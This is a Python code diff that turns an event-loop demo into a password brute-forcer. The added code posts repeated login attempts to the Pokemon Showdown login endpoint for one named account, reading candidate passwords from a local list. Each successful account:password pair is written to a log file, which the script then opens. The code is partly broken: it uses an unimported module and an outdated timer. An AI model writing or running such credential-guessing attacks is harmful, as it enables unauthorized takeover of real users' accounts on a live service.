@@ -1,10 +1,11 @@
 from selectors import DefaultSelector, EVENT_WRITE, EVENT_READ
 import socket
-import time
-from os import path
+from time import clock
+import os
+import config
+import requests
 from re import findall
-from funcs import run_crack
-
+start = clock()
 selector = DefaultSelector()
 n_jobs = 0
 
@@ -66,9 +67,42 @@ def get(path):
     print((b''.join(buf)).decode().split('\n')[0])
     n_jobs -= 1
 
-start = time.time()
-Task(run_crack())
-#Task(get('/bar'))
+    
+import os
+import config
+import requests
+from re import findall
+from config import *
+
+
+def attempt_login(account, passwd):
+    """Takes an account name and password
+    as arguments and returns true
+    if the login is successful
+    otherwise returns []"""
+    request = requests.post("http://play.pokemonshowdown.com/~~showdown/action.php",
+                            data={'act': "login",
+                                  'name': account,
+                                  'pass': passwd,
+                                  'challengekeyid': '3',
+                                  'challenge': ""})
+    #return request.text
+    if findall("\"loggedin\":true", str(request.text)):
+        with open(config.logs, 'a') as logs:
+            logs.write(account+": "+passwd+'\n')
+            os.startfile(config.logs)
+        return 'HIT'
+    else:
+        return 'MISS'    
+
+PATH = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))+"\\"
+
+with open(PATH+'passwds.txt') as passwds:
+    passwds = [passwd.rstrip() for passwd in passwds]
+
+for passwd in passwds:
+    Task(attempt_login('yumhum', passwd))
+print(clock() - start)
 
 while n_jobs:
     events = selector.select()
@@ -76,4 +110,4 @@ while n_jobs:
         future = key.data
         future.resolve()
 
-print('took %.2f seconds' % (time.time() - start))
+
